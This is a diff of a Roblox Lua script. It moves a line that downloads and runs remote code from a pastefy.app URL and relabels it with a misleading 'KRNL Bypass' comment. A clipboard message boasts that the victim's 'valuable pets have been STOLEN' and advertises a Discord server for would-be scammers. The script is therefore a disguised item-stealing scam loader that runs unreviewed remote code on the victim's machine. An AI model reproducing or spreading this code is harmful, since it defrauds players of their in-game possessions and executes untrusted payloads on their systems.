@@ -11,8 +11,7 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-        loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
-        
+
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -30,6 +29,9 @@
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
+
+        --KRNL Bypass
+        loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
